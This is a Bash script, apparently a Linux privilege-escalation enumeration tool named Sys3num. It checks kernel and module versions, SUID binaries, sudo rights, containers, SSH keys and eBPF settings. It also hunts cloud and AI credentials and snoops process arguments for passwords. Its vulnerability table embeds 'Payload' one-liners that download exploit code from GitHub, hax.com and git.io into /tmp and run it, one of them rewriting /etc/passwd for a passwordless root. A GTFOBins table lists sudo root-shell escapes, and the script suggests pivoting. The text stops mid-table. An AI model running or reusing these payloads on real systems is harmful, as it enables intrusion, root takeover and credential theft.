#!/bin/bash

# ============================================================
# Sys3num - System Enumeration Tool for Privilege Escalation Recon
# Version 3.0 - Updated 2026-03 by Lakshan
# ============================================================

# --- Timing ---
START_TIME=$(date +%s)

# --- ANSI Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# --- Findings Tracking (uses temp file to work across subshells) ---
FINDINGS_FILE=$(mktemp /tmp/sys3num_findings.XXXXXX 2>/dev/null || mktemp)
ANY_VULN_FOUND=0

# Log a finding: log_finding SEVERITY CATEGORY "message"
log_finding() {
    local severity="$1" category="$2"
    shift 2
    local message="$*"
    echo "${severity}|${category}|${message}" >> "$FINDINGS_FILE"
    case "$severity" in
        CRITICAL) echo -e "  ${RED}[CRITICAL] $message${NC}" ;;
        HIGH)     echo -e "  [HIGH] $message" ;;
        MEDIUM)   echo -e "  [MEDIUM] $message" ;;
        INFO)     echo -e "  [INFO] $message" ;;
    esac
}

# --- Cleanup ---
cleanup() {
    rm -f "$FINDINGS_FILE" 2>/dev/null
}
trap cleanup EXIT

# --- Help ---
show_help() {
    cat << 'HELPEOF'
Sys3num v3.0 - System Enumeration Tool for Privilege Escalation Recon

Usage: ./sys3num.sh [OPTIONS]

Options:
  --help, -h        Show this help message and exit
  --quick           Quick scan (limited search scope)
  --stealth         Stealth mode (avoid noisy operations)
  --online          Auto-run online NVD check (skip prompt)
  --api-key KEY     NVD API key for faster online lookups
  --output FILE     Save results to FILE (ANSI colors stripped)
  --json            Output findings as JSON only (suppresses normal output)

Examples:
  sudo ./sys3num.sh                          # Full interactive scan
  sudo ./sys3num.sh --quick --stealth        # Fast, low-noise scan
  sudo ./sys3num.sh --output report.txt      # Save to file
  sudo ./sys3num.sh --json > findings.json   # JSON output only

Note: Run as root/sudo for complete enumeration.
HELPEOF
    exit 0
}

# --- WSL2 Detection ---
IS_WSL=false
detect_wsl() {
    if uname -r 2>/dev/null | grep -qi 'microsoft\|WSL'; then
        IS_WSL=true
        echo -e "\n${CYAN}[*] WSL2 Environment Detected${NC}"
        echo -e "${DIM}   Note: Container escape, capabilities, and /proc checks may${NC}"
        echo -e "${DIM}   behave differently under WSL2.${NC}"
        log_finding "INFO" "environment" "Running inside WSL2 (Windows Subsystem for Linux)"
    fi
}

# Offline vulnerability database (expand as needed)
# Format: associative array for kernel ranges and module:version with CVE/info
declare -A offline_vulns

# Historical / Critical Kernel Exploits
offline_vulns["kernel:2.6.22-4.8.3"]="CVE-2016-5195 (Dirty COW) - Race condition in memory management allowing priv esc. | Payload: curl -s https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > /tmp/dcow.c && gcc -pthread /tmp/dcow.c -o /tmp/dcow && /tmp/dcow /etc/passwd \"root::0:0::/root:/bin/bash\""
offline_vulns["kernel:5.8-5.16.11"]="CVE-2022-0847 (Dirty Pipe) - Allows overwriting data in arbitrary read-only files. | Payload: curl -sL https://hax.com/dp.c -o /tmp/dp.c && gcc /tmp/dp.c -o /tmp/dp && /tmp/dp /usr/bin/su"
offline_vulns["kernel:<4.6.3"]="CVE-2016-3134 (Netfilter bug) - Potential priv esc via iptables."
offline_vulns["kernel:4.14-5.18.14"]="CVE-2022-2586 (nft_object UAF) - Use-After-Free in netfilter nf_tables."

# Recent Kernel / eBPF / Subsystem Exploits (2023 - 2025+)
# NOTE: CVE-2024-1086 duplicate removed. Using broadest affected range in the 2025 section below.
offline_vulns["kernel:6.1-6.4.1"]="CVE-2023-32233 (Netfilter UAF) - Privilege escalation via nf_tables. | Payload: curl -sL https://github.com/xkaneiki/CVE-2023-32233/raw/main/exploit -o /tmp/exp && chmod +x /tmp/exp && /tmp/exp"
offline_vulns["kernel:5.15-6.5.0"]="CVE-2023-4911 (Looney Tunables) - Buffer overflow in glibc ld.so (technically glibc, triggered via suid). | Payload: python3 -c 'import os; print(\"Search github for CVE-2023-4911 python pocs based on distro\")'"
offline_vulns["kernel:6.1-6.1.24"]="CVE-2023-35001 (nftables) - Out-of-bounds Read/Write in nftables."
offline_vulns["kernel:6.2-6.5.5"]="CVE-2023-45871 (eBPF) - Priv esc via eBPF verifier flaw."
offline_vulns["kernel:5.15-6.2"]="CVE-2023-1829 (tc/flower) - UAF in traffic control index filter."
offline_vulns["kernel:4.14-6.3.1"]="CVE-2023-31248 (io_uring) - Memory corruption in io_uring subsystem."
offline_vulns["kernel:5.19-6.1.19"]="CVE-2023-0179 (nftables) - Integer underflow in Netfilter nft_payload."

# Recent Exploits (2025 - 2026)
offline_vulns["kernel:5.14-6.6.99"]="CVE-2024-1086 (nf_tables UAF) - Actively exploited in ransomware for local root. | Payload: curl -sL https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0/exploit -o /tmp/exp && chmod +x /tmp/exp && /tmp/exp"
offline_vulns["kernel:5.6-6.13.99"]="CVE-2025-21692 (sch_ets OOB) - Local privilege escalation via ETS scheduler."
# NOTE: CVE-2025-38617 affects all unpatched kernels. Gated behind build-date check in check_offline_kernel().
offline_vulns["kernel:all_unpatched"]="CVE-2025-38617 (packet socket race) - 20-year-old bug, full priv-esc + container escape. | Payload: curl -sL https://git.io/cve-2025-38617.sh -o /tmp/exp.sh && bash /tmp/exp.sh"
offline_vulns["kernel:5.10-6.12.99"]="CVE-2025-40249 (GPIO UAF) - Priority priv-esc/DoS via GPIO controller."
offline_vulns["kernel:5.15-6.10.99"]="CVE-2025-38141 (dm zone reporting race) - UAF in dm zone reporting."

# Vulnerable Modules / Drivers
offline_vulns["vsock:any"]="CVE-2021-26708 - Race conditions in VSOCK module leading to priv esc."
offline_vulns["overlayfs:any"]="CVE-2023-0386 - Improper ownership management in OverlayFS for priv esc."
offline_vulns["overlay:any"]="CVE-2021-3493 - OverlayFS Ubuntu-specific privilege escalation."
offline_vulns["usb_audio:any"]="CVE-2024-53197 - Out-of-bounds access in USB-audio driver for priv esc."
offline_vulns["packet:any"]="CVE-2020-14386 - Memory corruption in AF_PACKET sockets for priv esc."
offline_vulns["bluetooth:any"]="CVE-2023-2002 - Out-of-bounds write in Bluetooth HCI subsystem."
offline_vulns["vboxguest:any"]="CVE-2021-2145 - VirtualBox guest additions priv esc."
offline_vulns["io_uring:any"]="CVE-2024-0582 - Use-After-Free in io_uring leading to priv esc."

# Function to robustly compare semantic versions
semver_compare() {
    local a=(${1//./ }) b=(${2//./ })  # split on dot
    for i in {0..2}; do
        local x=${a[i]:-0} y=${b[i]:-0}
        (( x > y )) && return 1   # a > b -> not vulnerable (assuming range is vulnerable < high)
        (( x < y )) && return 0   # a < b -> vulnerable
    done
    return 0  # equal -> check if inclusive
}

# Function to check if version is in range (robust comparison)
version_in_range() {
    local ver=$1 low=$2 high=$3
    # Check if ver >= low AND ver <= high
    semver_compare "$low" "$ver" && semver_compare "$ver" "$high"
    return $?
}

# Function to check offline vulns for kernel
check_offline_kernel() {
    local kernel=$1
    echo -e "\n${YELLOW}[*] Offline Kernel Vuln Check:${NC}"
    local k_found=0
    for key in "${!offline_vulns[@]}"; do
        if [[ $key == kernel:* ]]; then
            range=${key#kernel:}
            # Handle the "all_unpatched" special case — only flag if kernel build is >90 days old
            if [[ $range == "all_unpatched" ]]; then
                local build_date
                build_date=$(uname -v 2>/dev/null | grep -oP '\w+ \w+ \d+ .* \d{4}' || echo "")
                if [ -n "$build_date" ]; then
                    local build_epoch now_epoch age_days
                    build_epoch=$(date -d "$build_date" +%s 2>/dev/null || echo 0)
                    now_epoch=$(date +%s)
                    age_days=$(( (now_epoch - build_epoch) / 86400 ))
                    if [ "$age_days" -gt 90 ] 2>/dev/null; then
                        echo -e "${YELLOW}[!] Possibly Vulnerable (kernel ${age_days}d old): ${offline_vulns[$key]}${NC}"
                        k_found=1
                    fi
                fi
                continue
            fi
            if [[ $range == *-* ]]; then
                low=${range%-*} high=${range#*-}
                if version_in_range "$kernel" "$low" "$high"; then
                    echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                    k_found=1
                    ANY_VULN_FOUND=1
                fi
            elif [[ $range == \<* ]]; then
                high=${range#<}
                if [[ $kernel < $high ]]; then
                    echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                    k_found=1
                    ANY_VULN_FOUND=1
                fi
            elif [[ $kernel == $range* ]]; then
                echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                k_found=1
                ANY_VULN_FOUND=1
            fi
        fi
    done
    [ $k_found -eq 0 ] && echo -e "${GREEN}[+] No known vulns in offline DB for kernel $kernel.${NC}"
}

# Function to check offline vulns for modules
check_offline_modules() {
    local modules_with_versions=$1
    echo -e "\n${YELLOW}[*] Offline Module Vuln Check:${NC}"
    local m_found=0
    while IFS=':' read -r mod ver; do
        for key in "${!offline_vulns[@]}"; do
            if [[ $key == $mod:* ]]; then
                vuln_ver=${key#*:}
                if [[ $vuln_ver == "any" || $ver == $vuln_ver* ]]; then
                    echo -e "${RED}[!] $mod (version: $ver): ${offline_vulns[$key]}${NC}"
                    m_found=1
                    ANY_VULN_FOUND=1
                fi
            fi
        done
    done <<< "$(echo -e "$modules_with_versions" | grep -v '^$')"
    [ $m_found -eq 0 ] && echo -e "${GREEN}[+] No known vulns in offline DB for listed modules.${NC}"
}

# Function for online vuln check via NVD API
online_vuln_check() {
    local query=$1
    # Simple URL encoding for spaces
    local query_encoded="${query// /%20}"
    local url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=$query_encoded&resultsPerPage=10"
    local response=""

    if [ -n "$NVD_API_KEY" ]; then
        response=$(curl -m 10 -H "apiKey: $NVD_API_KEY" -s "$url")
    else
        echo -e "${YELLOW}[*] No NVD API key provided. Adding 6s delay to respect API rate limits...${NC}"
        sleep 6
        response=$(curl -m 10 -s "$url")
    fi

    if [ -z "$response" ] || [[ "$response" == *"Request forbidden"* ]] || [[ "$response" == *"Rate limit"* ]]; then
        echo -e "${RED}[!] Error: Curl failed, timed out, rate-limited, or no response.${NC}"
        return
    fi
    local total=$(echo "$response" | grep -o '"totalResults":[0-9]*' | cut -d: -f2)
    if [ -z "$total" ] || [ "$total" -eq 0 ]; then
        echo -e "${GREEN}[+] No vulnerabilities found online for '$query'.${NC}"
    else
        local cves=$(echo "$response" | grep -o '"cveId":"CVE-[^"]*' | sed 's/"cveId":"//g' | paste -sd, -)
        echo -e "${RED}[!] Potential CVEs for '$query': $cves${NC}"
        echo -e "Details: Visit https://nvd.nist.gov/vuln/detail/<CVE-ID> for more."
    fi
}

# Function to detect internet
has_internet() {
    ping -c 1 8.8.8.8 >/dev/null 2>&1
}

# Function to detect Linux distribution
detect_distro() {
    echo -e "\n${YELLOW}[*] Distribution Info:${NC}"
    if [ -f /etc/os-release ]; then
        cat /etc/os-release | grep -E '^PRETTY_NAME=' | cut -d= -f2 | tr -d '"' | sed 's/^/- /'
    elif command -v lsb_release >/dev/null 2>&1; then
        lsb_release -d | awk -F'\t' '{print "- " $2}'
    else
        echo "- Unknown distribution"
    fi
}

# Function to list installed packages
list_packages() {
    echo -e "\n${YELLOW}[*] Installed Packages (Top 10 by size, if available):${NC}"
    if command -v dpkg-query >/dev/null 2>&1; then
        dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -nr | head -n 10 | awk '{print "- " $2 " (" $1 " KB)"}'
    elif command -v rpm >/dev/null 2>&1; then
        rpm -qa --queryformat '%{SIZE}\t%{NAME}\n' | sort -nr | head -n 10 | awk '{print "- " $2 " (" int($1/1024) " KB)"}'
    elif command -v apk >/dev/null 2>&1; then
        apk info -s 2>/dev/null | grep size | sort -nr -k3 | head -n 10 | awk '{print "- " $1 " (" $3 " bytes)"}'
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Qi 2>/dev/null | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -nr | head -n 10 | awk '{print "- " $2 " (" $1 ")"}'
    elif command -v dnf >/dev/null 2>&1; then
        dnf list installed 2>/dev/null | tail -n +2 | head -n 10 | awk '{print "- " $1 " (" $2 ")"}'
    elif command -v zypper >/dev/null 2>&1; then
        zypper se -i 2>/dev/null | grep '^i' | head -n 10 | awk -F'|' '{print "- " $2}'
    elif command -v snap >/dev/null 2>&1; then
        snap list 2>/dev/null | tail -n +2 | head -n 10 | awk '{print "- " $1 " (" $2 ")"}'
    elif command -v flatpak >/dev/null 2>&1; then
        flatpak list 2>/dev/null | head -n 10 | awk '{print "- " $1 " (" $3 ")"}'
    elif command -v nix-env >/dev/null 2>&1; then
        nix-env -q 2>/dev/null | head -n 10 | awk '{print "- " $1}'
    else
        echo "- Package manager not supported for quick listing."
    fi
}

# Updated list_drivers for binary-less enumeration
list_drivers() {
    echo -e "\n${YELLOW}[*] Installed Kernel Drivers (Modules):${NC}"
    modules_with_versions=""
    
    local MODULES=""
    if command -v lsmod >/dev/null 2>&1; then
        MODULES=$(lsmod | tail -n +2 | awk '{print $1}')
    elif [ -r /proc/modules ]; then
        MODULES=$(cat /proc/modules | awk '{print $1}')
    fi

    if [ -n "$MODULES" ]; then
        for mod in $MODULES; do
            local VERSION=""
            if command -v modinfo >/dev/null 2>&1; then
                VERSION=$(modinfo "$mod" 2>/dev/null | grep -i '^version:' | awk '{print $2}')
            elif [ -r "/sys/module/$mod/version" ]; then
                VERSION=$(cat "/sys/module/$mod/version" 2>/dev/null)
            fi
            
            [ -z "$VERSION" ] && VERSION="unknown"
            echo "- $mod (version: $VERSION)"
            modules_with_versions+="$mod:$VERSION"$'\n'
        done
    else
        if [ ! -r /proc/modules ]; then
            echo -e "${RED}[!] Access Denied to /proc/modules. System heavily hardened (RBAC/hidepid).${NC}"
        else
            echo "- Could not read /proc/modules or lsmod."
        fi
    fi
}

# New Enumeration Functions

check_critical_versions() {
    echo -e "\n${YELLOW}[*] Critical Userland Binaries (Direct Version Extraction):${NC}"

    if command -v sudo >/dev/null 2>&1; then
        SUDO_VER=$(sudo -V 2>&1 | grep -i "Sudo version" | head -n 1 | awk '{print $3}')
        echo -e "- sudo: $SUDO_VER"
        # Fixed: old regex ^1\.8\.[2-9] missed 1.8.10-1.8.31. Now matches all 1.8.x
        if [[ "$SUDO_VER" =~ ^1\.8\. || "$SUDO_VER" =~ ^1\.9\.[0-4]$ || "$SUDO_VER" == "1.9.5" || "$SUDO_VER" == "1.9.5p1" ]]; then
            echo -e "  ${RED}-> Vulnerable to CVE-2021-3156 (Baron Samedit)!${NC}"
        fi
    fi

    if command -v pkexec >/dev/null 2>&1; then
        PKEXEC_VER=$(pkexec --version 2>&1 | head -n 1 | awk '{print $3}')
        echo -e "- pkexec: $PKEXEC_VER"
        if [[ "$PKEXEC_VER" =~ ^0\.([0-9]|[1-9][0-9]|1[0-1][0-9])$ ]]; then
            echo -e "  ${RED}-> Vulnerable to CVE-2021-4034 (PwnKit)!${NC}"
        fi
    fi

    if command -v bash >/dev/null 2>&1; then
        BASH_VER=$(bash --version 2>&1 | head -n 1 | awk '{print $4}')
        echo -e "- bash: $BASH_VER"
        if [[ "$BASH_VER" =~ ^4\.3 || "$BASH_VER" =~ ^[1-3]\. ]]; then
             echo -e "  ${RED}-> Check for CVE-2014-6271 (Shellshock)!${NC}"
        fi
    fi

    if command -v dbus-daemon >/dev/null 2>&1; then
        DBUS_VER=$(dbus-daemon --version 2>/dev/null | grep -i version | awk '{print $3}')
        echo -e "- dbus-daemon: $DBUS_VER"
    fi
}

hunt_cloud_ai_secrets() {
    echo -e "\n${YELLOW}[*] Cloud & AI Credential Hunting:${NC}"
    
    for cred_file in ~/.aws/credentials /root/.aws/credentials /home/*/.aws/credentials ~/.kube/config /root/.kube/config /home/*/.kube/config ~/.config/gcloud/credentials.db /root/.config/gcloud/credentials.db /home/*/.config/gcloud/credentials.db; do
        if [ -f "$cred_file" ] && [ -r "$cred_file" ] 2>/dev/null; then
            echo -e "${RED}[!] Found Cloud Credential File: $cred_file${NC}"
        fi
    done

    echo -e "${YELLOW}[*] Scanning for .env files with AI/Cloud Secrets (up to 3 levels deep):${NC}"
    find /var/www /opt /home /root -maxdepth 3 -type f -name ".env" 2>/dev/null | while read -r env_file; do
        if [ -r "$env_file" ]; then
            SECRETS=$(grep -E 'OPENAI_API_KEY|ANTHROPIC_API_KEY|HUGGINGFACE|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GITLAB_TOKEN|GITHUB_TOKEN|SLACK_BOT_TOKEN' "$env_file" 2>/dev/null)
            if [ -n "$SECRETS" ]; then
                echo -e "${RED}[!] Secrets found in $env_file :${NC}"
                echo "$SECRETS" | sed 's/=.*/=***REDACTED***/'
            else
                echo -e "${GREEN}[+] Found $env_file (No targeted secrets matched)${NC}"
            fi
        fi
    done
}

scrape_deleted_secrets() {
    echo -e "\n${YELLOW}[*] Scraping Deleted / Ghost Secret Files (lsof +L1):${NC}"
    if command -v lsof >/dev/null 2>&1; then
        GHOSTS=$(lsof -nP +L1 2>/dev/null | grep deleted | grep -E '/tmp|/dev/shm')
        if [ -n "$GHOSTS" ]; then
            echo -e "${RED}[!] Found deleted files still held open in memory:${NC}"
            echo "$GHOSTS" | head -n 10
            echo -e "${YELLOW}Investigate by reading /proc/<PID>/fd/<FD>${NC}"
        else
            echo -e "${GREEN}[+] No obvious ghost files found in /tmp or /dev/shm.${NC}"
        fi
    else
        echo -e "${YELLOW}- lsof not found, skipping ghost file check.${NC}"
    fi
}

# Helper: get package version for a binary
get_pkg_version() {
    local bin_path="$1"
    local ver=""
    if command -v dpkg >/dev/null 2>&1; then
        local pkg=$(dpkg -S "$bin_path" 2>/dev/null | head -n1 | cut -d: -f1)
        if [ -n "$pkg" ]; then
            ver=$(dpkg-query -W -f='${Version}' "$pkg" 2>/dev/null)
        fi
    elif command -v rpm >/dev/null 2>&1; then
        ver=$(rpm -qf "$bin_path" 2>/dev/null | head -n1)
    fi
    echo "$ver"
}

check_suid_sgid() {
    echo -e "\n${YELLOW}[*] SUID/SGID Binaries (Top 20):${NC}"
    local suid_list
    # Always use targeted directories to avoid hanging on WSL2/unusual mounts
    suid_list=$(find /usr/bin /bin /sbin /usr/sbin /usr/local/bin /usr/local/sbin /usr/lib /opt -maxdepth 4 -xdev -type f -a \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null | head -n 20)
    echo "$suid_list" | while read line; do
        [ -z "$line" ] && continue
        echo -e "${RED}- $line${NC}"
    done

    # Version extraction for notable SUID binaries
    echo -e "\n${YELLOW}[*] SUID Binary Version Details:${NC}"
    declare -A suid_cve_map
    suid_cve_map["polkit-agent-helper-1"]="CVE-2021-4034 (PwnKit) if polkit < 0.120"
    suid_cve_map["pkexec"]="CVE-2021-4034 (PwnKit) if polkit < 0.120"
    suid_cve_map["snap-confine"]="CVE-2021-44731 (snap-confine race) if snapd < 2.54.3"
    suid_cve_map["sudo"]="CVE-2021-3156 (Baron Samedit) if sudo 1.8.2-1.9.5p1"
    suid_cve_map["su"]="Check util-linux version for known issues"
    suid_cve_map["mount"]="Check util-linux version for known issues"
    suid_cve_map["umount"]="Check util-linux version for known issues"
    suid_cve_map["fusermount3"]="CVE-2023-0386 if FUSE/OverlayFS is misconfigured"
    suid_cve_map["passwd"]="Check shadow-utils / passwd package version"
    suid_cve_map["chfn"]="Check util-linux version"
    suid_cve_map["chsh"]="Check util-linux version"
    suid_cve_map["newgrp"]="Check shadow-utils version"
    suid_cve_map["gpasswd"]="Check shadow-utils version"
    suid_cve_map["ssh-keysign"]="Check OpenSSH version"
    suid_cve_map["dbus-daemon-launch-helper"]="Check dbus version"

    # Extract binary paths from the suid list
    echo "$suid_list" | awk '{print $NF}' | while read -r bin_path; do
        [ -z "$bin_path" ] && continue
        local bin_name=$(basename "$bin_path")
        local ver=""

        # Try binary's own --version first
        case "$bin_name" in
            sudo)       ver=$(sudo -V 2>&1 | head -n1 | awk '{print $3}') ;;
            pkexec)     ver=$(pkexec --version 2>&1 | head -n1 | awk '{print $3}') ;;
            su|mount|umount|chfn|chsh)
                        ver=$($bin_path --version 2>&1 | head -n1 | grep -oP '[0-9]+\.[0-9]+[\w.]*') ;;
            fusermount3|fusermount)
                        ver=$($bin_path --version 2>&1 | head -n1 | grep -oP '[0-9]+\.[0-9]+[\w.]*') ;;
            snap-confine)
                        ver=$(snap --version 2>/dev/null | grep snapd | awk '{print $2}') ;;
            ssh-keysign)
                        ver=$(ssh -V 2>&1 | grep -oP '[0-9]+\.[0-9p]+') ;;
            *)
                        ver=$(get_pkg_version "$bin_path") ;;
        esac

        [ -z "$ver" ] && ver=$(get_pkg_version "$bin_path")
        [ -z "$ver" ] && ver="unknown"

        local cve_note=""
        if [ -n "${suid_cve_map[$bin_name]+x}" ]; then
            cve_note=" | ${RED}Advisory: ${suid_cve_map[$bin_name]}${NC}"
        fi
        echo -e "- ${BLUE}$bin_path${NC} -> version: ${YELLOW}$ver${NC}$cve_note"
    done
}

check_writable_critical() {
    echo -e "\n${YELLOW}[*] Writable Critical Files:${NC}"
    for file in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ld.so.conf /etc/sudoers.d/*; do
        if [ -w "$file" ]; then
            echo -e "${RED}[!] WARNING: $file is writable by the current user!${NC}"
        else
            echo -e "${GREEN}[+] $file is securely configured (not writable).${NC}"
        fi
    done
}

check_privileges() {
    echo -e "\n${YELLOW}[*] Privilege Escalation Managers (sudo/doas/pkexec):${NC}"
    
    if command -v sudo >/dev/null 2>&1; then
        SUDO_OUT=$(sudo -n -l 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo -e "${RED}[!] Can execute the following via sudo without password:${NC}"
            echo "$SUDO_OUT"
        else
            echo -e "${GREEN}[+] Password required for sudo or not allowed.${NC}"
        fi
    else
        echo -e "${YELLOW}- sudo command not found.${NC}"
    fi

    if command -v doas >/dev/null 2>&1 && [ -r /etc/doas.conf ]; then
        DOAS_OUT=$(grep -E '^permit.*nopass' /etc/doas.conf 2>/dev/null)
        if [ -n "$DOAS_OUT" ]; then
            echo -e "${RED}[!] Found 'nopass' directives in /etc/doas.conf:${NC}"
            echo "$DOAS_OUT"
        fi
    fi

    if command -v pkexec >/dev/null 2>&1; then
        if [ -u "$(command -v pkexec)" ]; then
            echo -e "${RED}[!] pkexec is SUID root! Check for CVE-2021-4034 (PwnKit) if system is old.${NC}"
        fi
    fi
}

check_cron() {
    echo -e "\n${YELLOW}[*] Cron Jobs (/etc/crontab):${NC}"
    if [ -f /etc/crontab ]; then
        grep -v '^\s*#' /etc/crontab | grep -v '^\s*$' | while read line; do
            echo -e "- $line"
        done
    else
        echo -e "${YELLOW}- /etc/crontab not found.${NC}"
    fi
}

check_capabilities() {
    echo -e "\n${YELLOW}[*] Exploitable Capabilities:${NC}"
    if command -v getcap >/dev/null 2>&1; then
        # Scan common binary/lib dirs instead of / to avoid hanging on WSL2/Windows mounts
        local CAP_DIRS="/usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /usr/lib /opt /snap"
        # Also include /bin and /sbin if they're real dirs (not symlinks to /usr)
        [ -d /bin ] && ! [ -L /bin ] && CAP_DIRS="$CAP_DIRS /bin"
        [ -d /sbin ] && ! [ -L /sbin ] && CAP_DIRS="$CAP_DIRS /sbin"

        if [ "$STEALTH_MODE" = true ]; then
            echo -e "${YELLOW}- Stealth mode: scanning common binary dirs only.${NC}"
        fi

        # Use timeout to prevent hangs on unusual filesystems
        local cap_output
        cap_output=$(timeout 15 getcap -r $CAP_DIRS 2>/dev/null | head -n 20)
        if [ -n "$cap_output" ]; then
            echo "$cap_output" | while read line; do
                [ -z "$line" ] && continue
                echo -e "${RED}- $line${NC}"
            done
        else
            echo -e "${GREEN}[+] No files with special capabilities found.${NC}"
        fi
    else
        echo -e "${YELLOW}- getcap command not found.${NC}"
    fi
}

check_dependencies() {
    echo -e "\n${YELLOW}[*] Checking dependencies...${NC}"
    for cmd in awk curl ping dpkg-query lsmod modinfo find getcap sudo grep timeout; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo -e "${RED}[!] Warning: '$cmd' is not installed. Some features may not work.${NC}"
        fi
    done
}

check_container_escape() {
    echo -e "\n${YELLOW}[*] Container & Orchestration Escape Checks:${NC}"
    if [ ! -r /proc/1/cgroup ] && [ ! -d /proc/1 ]; then
        echo -e "${RED}[!] Access Denied to /proc/1. System heavily hardened (hidepid). Container checks mostly blinded!${NC}"
    elif [ -f /.dockerenv ] || grep -q 'docker' /proc/1/cgroup 2>/dev/null; then
        echo -e "${RED}[!] Inside a Docker container!${NC}"
        if [ -S /var/run/docker.sock ]; then
            echo -e "${RED}[!] WARNING: Docker socket is mounted at /var/run/docker.sock! (Trivial Escape)${NC}"
        fi
        CAP_EFF=$(cat /proc/1/status 2>/dev/null | grep CapEff | awk '{print $2}')
        if [ "$CAP_EFF" == "0000003fffffffff" ] || [ "$CAP_EFF" == "0000001fffffffff" ]; then
            echo -e "${RED}[!] WARNING: Container is running in --privileged mode!${NC}"
        fi
        
        # Advanced Networking Mapping (Pivoting)
        if command -v ip >/dev/null 2>&1; then
            SUBNET=$(ip -4 route show default 2>/dev/null | awk '{print $3}' | grep -E '^(172|10|192\.168)\.')
            if [ -n "$SUBNET" ]; then
                echo -e "${RED}[!] Container internal default route (Host network): $SUBNET${NC}"
                echo -e "${YELLOW} -> Pivot Suggestion: Use 'chisel' or 'sshuttle' to route traffic through this container into the host's internal VPC.${NC}"
            fi
        fi

        # Check if sharing host PID namespace
        if ps -ef 2>/dev/null | grep -q 'sbin/init\|systemd'; then
             echo -e "${RED}[!] Container appears to share the host's PID namespace (Found init/systemd)!${NC}"
        fi
    fi
    if [ -d /var/run/secrets/kubernetes.io ]; then
        echo -e "${RED}[!] Inside a Kubernetes Pod!${NC}"
        if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
            echo -e "${RED}[!] Service Account token is readable!${NC}"
        fi
    fi
}

check_live_process_snoop() {
    echo -e "\n${YELLOW}[*] Live Process Snooping (Monitoring for 5 seconds for passwords...):${NC}"
    timeout 5 bash -c '
    while true; do
        ps -eo command | grep -E "password|pass|login|ssh |mysql |curl |wget " | grep -v grep | grep -v sys3num
        sleep 0.5
    done' | sort | uniq | while read -r line; do
        if [ -n "$line" ]; then
            echo -e "${RED}[!] Suspicious Argument Caught: $line${NC}"
        fi
    done
    echo -e "${GREEN}[+] Snooping complete.${NC}"
}

check_ssh_persistence() {
    echo -e "\n${YELLOW}[*] SSH & Lateral Movement Checks:${NC}"
    if [ -n "$SSH_AUTH_SOCK" ] && [ -S "$SSH_AUTH_SOCK" ]; then
        echo -e "${RED}[!] SSH Agent Forwarding is active! (SSH_AUTH_SOCK=$SSH_AUTH_SOCK)${NC}"
    fi
    if [ -r /etc/ssh/sshd_config ]; then
        if grep -qE '^PermitRootLogin\s+yes' /etc/ssh/sshd_config; then
            echo -e "${RED}[!] Root SSH login is allowed (PermitRootLogin yes)${NC}"
        fi
        if grep -qE '^PasswordAuthentication\s+yes' /etc/ssh/sshd_config; then
            echo -e "${RED}[!] SSH Password Authentication is allowed!${NC}"
        fi
    fi
    local keys_found=false
    find /home /root -maxdepth 3 -type f \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null | while read -r key; do
        if [ "$keys_found" = false ]; then
            echo -e "${RED}[!] Discovered SSH Private Keys:${NC}"
            keys_found=true
        fi
        if [ -n "$key" ]; then
            echo -e "${RED} - $key${NC}"
        fi
    done
}

check_ebpf_ptrace() {
    echo -e "\n${YELLOW}[*] Modern Kernel Vectors (eBPF / ptrace):${NC}"
    if command -v sysctl >/dev/null 2>&1; then
        UNPRIV_BPF=$(sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null)
        if [ "$UNPRIV_BPF" == "0" ]; then
            echo -e "${RED}[!] Unprivileged eBPF is ENABLED! (kernel.unprivileged_bpf_disabled=0)${NC}"
        else
            echo -e "${GREEN}[+] Unprivileged eBPF is disabled.${NC}"
        fi

        PTRACE_SCOPE=$(sysctl -n kernel.yama.ptrace_scope 2>/dev/null)
        if [ "$PTRACE_SCOPE" == "0" ]; then
            echo -e "${RED}[!] ptrace scope is 0! Any process can ptrace another process owned by the same user. (Interactive Injection possible)${NC}"
        else
            echo -e "${GREEN}[+] ptrace scope is restricted.${NC}"
        fi
    fi
}

# --- Dangerous Group Membership ---

# ============================================================
# GTFOBins OFFLINE DATABASE + AUTO-EXPLOITATION SUGGESTIONS
# ============================================================

declare -A gtfo_sudo
declare -A gtfo_suid

# --- GTFOBins: Sudo escalation payloads ---
gtfo_sudo["vim"]='sudo vim -c '"'"':!/bin/bash'"'"''
gtfo_sudo["vi"]='sudo vi -c '"'"':!/bin/bash'"'"''
gtfo_sudo["nano"]='sudo nano -s /bin/bash /etc/hosts  # then Ctrl+T'
gtfo_sudo["find"]='sudo find . -exec /bin/bash \; -quit'
gtfo_sudo["python"]='sudo python -c '"'"'import os; os.system("/bin/bash")'"'"''
gtfo_sudo["python3"]='sudo python3 -c '"'"'import os; os.system("/bin/bash")'"'"''
gtfo_sudo["perl"]='sudo perl -e '"'"'exec "/bin/bash";'"'"''
gtfo_sudo["ruby"]='sudo ruby -e '"'"'exec "/bin/bash"'"'"''
gtfo_sudo["lua"]='sudo lua -e '"'"'os.execute("/bin/bash")'"'"''
gtfo_sudo["awk"]='sudo awk '"'"'BEGIN {system("/bin/bash")}'"'"''
gtfo_sudo["gawk"]='sudo gawk '"'"'BEGIN {system("/bin/bash")}'"'"''
gtfo_sudo["env"]='sudo env /bin/bash'
gtfo_sudo["less"]='sudo less /etc/shadow  # then type !/bin/bash'
